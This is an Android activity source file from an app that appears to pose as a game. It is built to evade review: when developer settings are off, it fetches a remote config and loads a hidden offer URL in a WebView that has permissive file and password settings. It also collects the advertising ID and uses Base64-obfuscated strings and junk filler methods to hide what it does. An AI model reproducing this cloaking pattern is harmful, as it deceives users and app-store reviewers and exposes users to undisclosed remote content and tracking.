package com.pshhaora.steecr;

import static com.pshhaora.steecr.ParseStr.decode;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.IOException;

import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;


public class P3S2 extends AppCompatActivity {
    public Context context;
    public static String strDeep;
    public static String AD_ID;
    private ProgressBar progressBar;
    private WebView webView;
    private String link;
    private ValueCallback<Uri[]> myFilePathCallback;
    private SharedPreferences sPrefs;
    private String offer;
    private String fb_Id;
    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQUEST_CODE = 1;
    public static String keyDefault;
    public static String statusAppsFlyer;
    public static String strAppsFlyer;
    public static String AppsFl_Id;
    public static boolean afLoaded;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progressBar = findViewById(R.id.progressBar);

        if (!devModeOff()) {   // TODO delete !

            context = this;
            webView = findViewById(R.id.webView);
            setWebView(webView);

            OkHttpClient cliengtraet = new OkHttpClient();
            Request reqgtraeuest = new Request.Builder().get().url(ParseStr.GistLink).build();
            okhttp3.Call call = cliengtraet.newCall(reqgtraeuest);

            call.enqueue(new Callback() {
                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                    startActivity(new Intent(getBaseContext(), Game.class));
                    donuthing();
                    finish();
                }

                @Override
                public void onResponse(okhttp3.Call call, final okhttp3.Response response) throws IOException {

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                String url = response.body().string();
                                String[] params = url.split("\\|");
                                offer = params[0];
                                keyDefault = params[1];
                                fb_Id = params[2];

                                init(fb_Id, P3S2.this);
                                donuthing();
//                            F_B_K facebook = new F_B_K(fb_Id, P3S2.this);
//                            facebook.init();

                                sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                                link = sPrefs.getString(URL_SHARED_PREF, null);
                                String goegoir = NOTHING();
                                if (goegoir == "sdsd") {
                                    int hgfh = 1;
                                    hgfh++;
                                }

                                // TODO uncomment
//                                if (link != null) {
//                                    webView.loadUrl(link);
//
//                                } else {
                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            startWebView(offer);
                                            donuthing();
                                        }
                                    }, 4812);
   //                             }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }

                    });
                }
            });
        } else {
         //   donuthing();
            Intent intent = new Intent(this, MenuActivity.class);
            startActivity(intent);

           // startActivity(new Intent(getBaseContext(), Game.class));
        //    finish();
        }
    }

    void startWebView(String link) {
        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
            String url = link + strAppsFlyer;
            Log.i("MyApp", "non-organic - " + url);
            webView.loadUrl(url);
        } else if (strDeep != null) {
            String url = link + strDeep;
            webView.loadUrl(url);
            Log.i("MyApp", "deepLink - " + url);
        } else {
            if (keyDefault.equals("NO")) {
                startActivity(new Intent(this, Game.class));
                finish();
            } else {
                String url = new ParseStr().parseOrganic(link);
                Log.i("MyApp", "organic - " + url);
                webView.loadUrl(url);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webView.goBack();
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK & data != null) {
            String dataString = data.getDataString();
            Uri[] result = new Uri[]{Uri.parse(dataString)};
            myFilePathCallback.onReceiveValue(result);
            myFilePathCallback = null;
        }
    }


    private boolean devModeOff() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        return devInt == 0;
    }


    class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePathCallback = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER)
                    .putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT)
                            .addCategory(Intent.CATEGORY_OPENABLE)
                            .setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
            donuthing();
            return true;
        }
    }

    class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webView.setVisibility(View.VISIBLE);
            progressBar.setVisibility(ProgressBar.INVISIBLE);
            donuthing();
            if (url.contains(decode("NDA0"))) {
                startActivity(new Intent(getBaseContext(), Game.class));
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefs.edit();
            editor.putString(URL_SHARED_PREF, url);
            editor.apply();
        }
    }


    private void setWebView(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.setWebViewClient(new MyWebViewClient());
    }


    public void init(String fbId, P3S2 mainActivity) {
        FacebookSdk.setApplicationId(fb_Id);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(mainActivity.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
        AppEventsLogger.activateApp(mainActivity.getApplication());


        AppLinkData.fetchDeferredAppLinkData(mainActivity.getApplication(), appLinkData -> {
                    String deepLink = appLinkData.getTargetUri().getQuery();
                     ParseStr parserStr = new ParseStr();
                     strDeep = parserStr.parse(deepLink);
                }
        );

        new Thread(new Runnable() {
            public void run() {
                try {
                    AD_ID = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesNotAvailableException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }


    String NOTHING() {
        int i = 0;
        do {
            i++;
            float d = 434f;

        } while (i > 4);
        return "sdadadasdadasdas";
    }


    public static void donuthing() {
        int[] fjghkfdf = {523, 1123, 213, 12, 312, 3, 4, 2};
        int temp = 0;
        for (int i = 1; i < fjghkfdf.length; i++) {
            for (int j = i; j > 0; j--) {
                if (fjghkfdf[j] < fjghkfdf[j - 1]) {
                    temp = fjghkfdf[j];
                    fjghkfdf[j] = fjghkfdf[j - 1];
                    fjghkfdf[j - 1] = temp;
                }
            }
        }
        for (int i = 0; i < fjghkfdf.length; i++) {
            temp++;
        }


    }
}